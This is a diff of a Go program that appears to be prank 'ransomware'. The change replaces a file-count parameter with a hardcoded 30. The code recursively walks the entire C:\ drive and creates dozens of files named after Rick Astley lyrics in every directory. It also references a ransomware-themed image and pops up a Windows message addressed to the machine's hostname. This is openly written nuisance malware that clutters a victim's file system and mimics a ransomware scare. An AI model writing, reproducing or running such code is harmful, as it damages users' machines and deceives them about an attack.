@@ -126,7 +126,7 @@ func filesystemTraversal(root string) { //Add backslashes to the dir otherwise g
 	fmt.Println("Recursion Success")
 }
 
-func filesystemTraversalWrite(root string, numberOfFiles int) { //Add backslashes to the dir otherwise go shits itself. Its not C:, it is C:\\
+func filesystemTraversalWrite(root string) { //Add backslashes to the dir otherwise go shits itself. Its not C:, it is C:\\
 	file, err := os.Open(root)
 	if err != nil {
 		return //panic(err) Replaced with return to see where we get (It does recursion just fine)
@@ -147,7 +147,7 @@ func filesystemTraversalWrite(root string, numberOfFiles int) { //Add backslashe
 		i := 0
 		//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
 		rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
-		for i < numberOfFiles {
+		for i < 30 {
 			os.Create(rickRoll[i])
 			i++
 		}
@@ -157,7 +157,7 @@ func filesystemTraversalWrite(root string, numberOfFiles int) { //Add backslashe
 		}
 		for _, e := range entries {
 			newRoot := root + e.Name() + "\\"
-			filesystemTraversalWrite(newRoot, numberOfFiles)
+			filesystemTraversalWrite(newRoot)
 		}
 
 	} else {
@@ -167,7 +167,7 @@ func filesystemTraversalWrite(root string, numberOfFiles int) { //Add backslashe
 }
 func main() {
 	root := "C:\\"
-	numberOfRandomFiles := 30 //Dont go over 50
+	//numberOfRandomFiles := 30 //Dont go over 50
 	imgURL := "https://brightlineit.com/wp-content/uploads/2017/10/171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
 	img := "171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
 	Hostname, err := os.Hostname()
@@ -186,7 +186,7 @@ func main() {
 	}
 
 	//createRandomFiles(numberOfRandomFiles)
-	filesystemTraversalWrite(root, numberOfRandomFiles)
+	filesystemTraversalWrite(root)
 
 	fmt.Println("Now calling Win32 to create a popup")
 	message := "Screen unlocked ya " + Hostname + "\x00" //Add the x00 or Windows loses it
